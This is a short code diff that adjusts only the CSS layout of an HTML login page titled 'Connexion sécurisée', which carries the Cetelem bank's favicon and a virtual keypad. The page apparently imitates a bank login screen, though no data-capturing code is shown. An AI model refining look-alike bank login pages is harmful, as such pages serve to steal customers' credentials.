@@ -6,7 +6,13 @@
   <title>Connexion sécurisée</title>
   <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
   <style>
-    body {
+   @media (min-width: 768px) {
+      .main-container {
+        width: 66.6667%;
+      }
+    }
+
+    body  {
       font-family: Arial, sans-serif;
       background-color: #c1d4cd;
       margin: 0;
@@ -154,7 +160,7 @@
     .keypad {
       display: grid;
       grid-template-columns: repeat(5, 1fr);
-      gap: 10px;
+      gap: 15px;
       justify-content: center;
       align-items: center;
       padding: 10px 0;
